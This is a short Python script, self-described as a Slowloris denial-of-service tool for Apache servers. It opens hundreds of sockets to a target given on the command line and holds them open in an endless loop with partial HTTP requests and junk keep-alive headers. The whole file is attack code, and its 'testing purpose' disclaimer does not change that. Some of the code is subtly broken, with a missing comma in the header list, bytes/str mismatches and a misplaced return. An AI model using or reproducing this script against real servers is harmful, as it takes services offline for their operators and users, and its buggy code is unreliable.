# SlowLorris - A DOS Script FOR an Appache server
# This script is only for testing purpose please use it wisely

import socket
import random
import time
import sys

log_level = 2

def log (text='', level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

# Headers for the web
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/2010010}"
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port=80, timeout=4): # creates a TCP connection with webserver
    """
    Function to initialise a socket connection
    @param :ip: - IP to connect with
    @param :port: - PORT to connect at
    @param :timeout: - Timeout for the socket conn.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip,port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000))) # creates a get request
    for header in regular_headers:
        s.send("{}\r\n".format(header).encode("utf-8"))
        return s

def main():
    if len(sys.argv) != 2:
        print("Usage: {} example.com".format(sys.argv[0]))
        return
    
    # Get IP from file argument
    ip = sys.argv[1]
    socket_count = 210 # number of sockets we want to use
    log("Attacking {} with {} sockets." .format(ip, socket_count))

    log("Creating sockets...")
    
    # Create socket conn and append it to socket list
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    # Keep pinging the web until you break program flow
    while True:
        log("Sending Keep-alive headers .. Socket count :{}  ".format(socket_count))

        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)))
            except socket.error:
                list_of_sockets.remove(s)
        for _ in range(socket_count - len(list_of_sockets)):
            log("Recreating socket ..")
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
            time.sleep(10) 

if __name__ == "__main__":
    main()
